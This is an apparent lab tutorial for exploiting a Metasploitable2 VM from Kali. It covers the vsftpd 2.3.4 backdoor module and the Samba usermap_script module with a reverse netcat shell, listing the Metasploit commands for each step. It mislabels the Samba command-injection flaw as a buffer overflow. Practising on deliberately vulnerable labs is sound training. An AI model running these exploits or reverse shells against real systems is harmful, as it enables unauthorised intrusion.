Task 1
For this task we will be using metasploitable and metasploit.

1) Launch Metasploitable environment. Login information: name: msfadmin; password: msfadmin.

2)Check IP address of Metasploitable. Using command: ifconfig
Here we need to ensure that settings of virtual box is correct. The network must be nat network.
Note down the IP address, for example 10.0.2.15 . We will use that later.

3)Open Kali, open Zenmap. We’ll use this to find vulnerabilities. The other option is to do it manually.
Enter the IP address we got from the last step in the target blank. Then click scan.

4)When scan is finished, we can a list of vulnerabilities of the system, but we will mainly talk about the ftp backdoor.
The version is vsftpd_234_backdoor

5)Then let’s exploit! Ref: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
Open metasploit in Kali.
Enter the following commands:
use exploit/unix/ftp/vsftpd_234_backdoor
// the following commands will be in msfconsole:.
show targets
show options
set RHOST (IP address of Metasploitable)

exploit
If the shell prompts that 1 shell session was opened, then the attack was successful are we are successfully inside the metasploitable2
machine. Now if we run these commands: 

  ifconfig (The ip address is the same with that of Metasploitable, we’re in that network, yeah!!)
  uname -a (It show the machine name [Linux Metasploitable2 ...]
  ls (Lists all the files of Metasploitable2 )

**Exit the metaspoitable the vsftpd_234_backdoor module using the "exit" command before trying the next task. 

Task 2:
The objective of this task is to exploit the Samba "username map script" Command Execution

 1) Start the module by typing in "use exploit/multi/samba/usermap_script"
 2) We list the target by using "show options" commands. (it is advisable you check the info before running the attack for better 
    understanding.
 3) Set RHOST ( Reciever host) to the metasploitable machine.
      set RHOST [IP address of Metasploitable2]
 4) We'll try to cause a buffer overflow on the Samba host and it can be achieved through a payload attack. In this case it'll be a
    reverse shell attack. Commands: 
      show payloads 
    
    From the list we'll choose the reverse netcat payload.
        
        set payload cmd/reverse/netcat
    
5) Once the payload is set we need to run "show options" again. This time we'll see there's payload option is created and LHOST is empty. 
   We need to set ourselves the LHOST ( Listener Host) so we can pick up the data sent by Metaspolitable.
      
      set LHOST [IP Address of Kali]

6) Now we need to run "exploit". Again if a session is created than it means the attack was successful.
